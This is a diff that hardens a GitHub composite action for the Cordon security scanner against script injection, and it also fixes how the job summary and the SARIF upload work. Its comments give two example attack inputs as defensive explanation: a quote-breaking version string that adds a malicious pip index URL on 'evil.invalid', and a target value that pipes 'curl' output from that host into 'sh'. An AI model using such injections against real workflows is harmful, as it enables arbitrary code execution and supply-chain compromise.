@@ -10,7 +10,7 @@ branding:
 
 inputs:
   target:
-    description: "Path, archive or package URL to scan."
+    description: "Path or archive to scan."
     required: false
     default: "."
   config:
@@ -19,7 +19,7 @@ inputs:
     default: ""
   policy:
     description: >
-      Organisation policy file or URL. Acts as a ceiling: a repository
+      Organisation policy file. Acts as a ceiling: a repository
       configuration cannot weaken anything it sets.
     required: false
     default: ""
@@ -93,33 +93,64 @@ runs:
 
     - name: Install Cordon
       shell: bash
+      env:
+        # Passed through the environment, never interpolated into the script.
+        # `env` resolves against the *calling* workflow, so a caller setting
+        # CORDON_VERSION to `0.1.0" --extra-index-url "https://evil.invalid/simple`
+        # broke out of the quotes and handed arbitrary arguments to pip -- a
+        # dependency-confusion primitive against the security scanner itself.
+        CORDON_VERSION: ${{ env.CORDON_VERSION || '0.1.0' }}
       run: |
+        set -euo pipefail
+        # Refuse anything that is not a version. The environment indirection
+        # above removes the shell-quoting break; this removes the pip-argument
+        # injection that survives it.
+        if ! printf '%s' "$CORDON_VERSION" | grep -Eq '^[0-9]+\.[0-9]+(\.[0-9]+)?([ab.]?[0-9]+)?$'; then
+          echo "::error::CORDON_VERSION is not a version number: $CORDON_VERSION"
+          exit 1
+        fi
         python -m pip install --disable-pip-version-check --quiet \
-          "cordon-scanner==${{ env.CORDON_VERSION || '0.1.0' }}"
+          "cordon-scanner==${CORDON_VERSION}"
 
     - name: Scan
       id: scan
       shell: bash
       working-directory: ${{ inputs.working-directory }}
+      env:
+        # Every input reaches the script through the environment. Interpolating
+        # `${{ }}` into a `run:` block expands it before bash parses the line,
+        # so a caller passing `target: '."; curl -s https://evil.invalid | sh; #'`
+        # executed arbitrary commands in the job. That is the same defect
+        # SUSPECT.CI.FETCH_EXEC.001 and MALWARE.CI.SECRET_EXFIL.001 detect in
+        # other people's workflows.
+        CORDON_TARGET: ${{ inputs.target }}
+        CORDON_SEVERITY: ${{ inputs.severity }}
+        CORDON_FAIL_ON: ${{ inputs.fail-on }}
+        CORDON_EVIDENCE: ${{ inputs.evidence }}
+        CORDON_CONFIG: ${{ inputs.config }}
+        CORDON_POLICY_FILE: ${{ inputs.policy }}
+        CORDON_FAIL_ON_INCOMPLETE: ${{ inputs.fail-on-incomplete }}
+        CORDON_SARIF: ${{ inputs.sarif }}
+        CORDON_SARIF_FILE: ${{ inputs.sarif-file }}
       run: |
         set +e
 
-        args=( scan "${{ inputs.target }}" )
-        args+=( --severity "${{ inputs.severity }}" )
-        args+=( --fail-on "${{ inputs.fail-on }}" )
-        args+=( --evidence "${{ inputs.evidence }}" )
+        args=( scan "$CORDON_TARGET" )
+        args+=( --severity "$CORDON_SEVERITY" )
+        args+=( --fail-on "$CORDON_FAIL_ON" )
+        args+=( --evidence "$CORDON_EVIDENCE" )
         args+=( --no-color )
 
-        [ -n "${{ inputs.config }}" ] && args+=( --config "${{ inputs.config }}" )
-        [ -n "${{ inputs.policy }}" ] && args+=( --policy "${{ inputs.policy }}" )
-        [ "${{ inputs.fail-on-incomplete }}" = "true" ] && args+=( --fail-on-incomplete )
+        [ -n "$CORDON_CONFIG" ] && args+=( --config "$CORDON_CONFIG" )
+        [ -n "$CORDON_POLICY_FILE" ] && args+=( --policy "$CORDON_POLICY_FILE" )
+        [ "$CORDON_FAIL_ON_INCOMPLETE" = "true" ] && args+=( --fail-on-incomplete )
 
         # Three outputs at once: annotations on the diff, a machine-readable
         # result for the summary, and SARIF for code scanning.
         args+=( --format github )
         args+=( --format "json:cordon-result.json" )
-        if [ "${{ inputs.sarif }}" = "true" ]; then
-          args+=( --format "sarif:${{ inputs.sarif-file }}" )
+        if [ "$CORDON_SARIF" = "true" ]; then
+          args+=( --format "sarif:$CORDON_SARIF_FILE" )
         fi
 
         cordon "${args[@]}"
@@ -131,15 +162,32 @@ runs:
 
         echo "findings=$count"            >> "$GITHUB_OUTPUT"
         echo "complete=$complete"         >> "$GITHUB_OUTPUT"
-        echo "sarif-file=${{ inputs.sarif-file }}" >> "$GITHUB_OUTPUT"
+        echo "sarif-file=$CORDON_SARIF_FILE" >> "$GITHUB_OUTPUT"
         echo "exit-code=$code"            >> "$GITHUB_OUTPUT"
 
-        # The job summary carries the readable report. Evidence is masked in
-        # markdown regardless of the evidence setting, because a summary is more
-        # widely visible than a log.
-        cordon report-summary cordon-result.json >> "$GITHUB_STEP_SUMMARY" 2>/dev/null \
-          || cordon scan "${{ inputs.target }}" --format markdown --quiet >> "$GITHUB_STEP_SUMMARY" 2>/dev/null \
-          || true
+        # The job summary carries the readable report, rendered from the JSON
+        # already produced above. It used to try `cordon report-summary`, which
+        # is not a command, and fall back to running a second full scan of the
+        # repository -- so the job paid for two scans, both failures were
+        # swallowed by `|| true`, and neither was visible.
+        python - <<'RENDER' >> "$GITHUB_STEP_SUMMARY" || true
+        import json
+        with open("cordon-result.json") as handle:
+            result = json.load(handle)
+        rows = [f for f in result["findings"] if f["category"] != "operational"]
+        print("## Cordon\n")
+        print(f"- findings: {len(rows)}")
+        print(f"- complete: {result['complete']}\n")
+        if rows:
+            print("| severity | rule | location |")
+            print("|---|---|---|")
+            for f in rows[:50]:
+                loc = f["location"]
+                where = loc["path"] + (f":{loc['line']}" if loc.get("line") else "")
+                print(f"| {f['severity']} | {f['rule_id']} | {where} |")
+            if len(rows) > 50:
+                print(f"\n_{len(rows) - 50} further findings omitted._")
+        RENDER
 
         exit $code
 
@@ -147,7 +195,12 @@ runs:
       # `always()` so results still reach code scanning when the gate fails.
       # Uploading only on success would hide findings precisely when there are
       # some, which defeats the purpose of uploading at all.
-      if: always() && inputs.sarif == 'true' && hashFiles(inputs.sarif-file) != ''
+      # hashFiles resolves against the workspace root while the file is written
+      # relative to working-directory, so the two disagreed whenever they
+      # differed and the upload was silently skipped. Both halves now use the
+      # same path.
+      if: always() && inputs.sarif == 'true'
+        && hashFiles(format('{0}/{1}', inputs.working-directory, inputs.sarif-file)) != ''
       uses: github/codeql-action/upload-sarif@f779452ac5af1c261dce0346a8f964149f49322b # v3.26.13
       with:
         sarif_file: ${{ inputs.working-directory }}/${{ inputs.sarif-file }}
